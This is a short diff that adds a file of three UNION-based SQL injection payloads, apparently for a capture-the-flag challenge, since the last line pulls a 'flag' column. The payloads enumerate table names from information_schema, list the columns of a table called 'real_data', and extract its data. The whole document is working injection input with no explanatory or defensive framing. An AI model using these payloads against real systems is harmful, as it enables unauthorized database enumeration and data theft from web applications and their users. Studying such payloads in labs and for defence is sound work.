@@ -1,0 +1,3 @@
+1' UNION SELECT table_name,2,3,4,5,6 FROM information_schema.tables -- 
+1' UNION SELECT column_name,2,3,4,5,6 FROM information_schema.columns WHERE table_name='real_data' -- 
+1' UNION SELECT flag,2,3,4,5,6 FROM real_data -- 
